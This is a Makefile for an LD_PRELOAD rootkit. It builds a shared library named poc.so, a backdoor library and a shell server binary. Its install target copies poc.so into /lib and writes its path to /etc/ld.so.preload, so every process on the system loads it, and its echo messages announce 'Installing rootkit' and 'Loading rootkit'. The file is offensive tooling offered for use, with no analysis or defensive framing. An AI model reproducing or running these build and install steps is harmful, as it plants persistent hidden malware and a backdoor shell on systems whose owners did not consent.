CFLAGS+= -Wall -g
LDFLAGS+= -lc -ldl -lutil
INSTALLDIR=/lib

all: config poc.so

config:
	@python3 config.py > const.h

poc.so: poc.c etc.c shell.c
	gcc -fPIC -g -c poc.c etc.c shell.c
	gcc -fPIC -shared -Wl,-soname,poc.so poc.o etc.o shell.c $(LDFLAGS) -o poc.so

backdoor.so: backdoor.c
	gcc -fPIC -shared -o backdoor.so backdoor.c -ldl

sserver: shellserver.c
	gcc -o shellserver shellserver.c shell.c etc.c -lpthread

install: all
	@echo [-] Checking the installation dir $(INSTALLDIR)
	@test -d $(INSTALLDIR) || mkdir $(INSTALLDIR)
	@echo [-] Installing rootkit
	@install -m 0755 poc.so $(INSTALLDIR)/
	@echo [-] Loading rootkit
	@echo $(INSTALLDIR)/poc.so > /etc/ld.so.preload
	@echo [-] Done

clean:
	rm *.so *.o shellserver

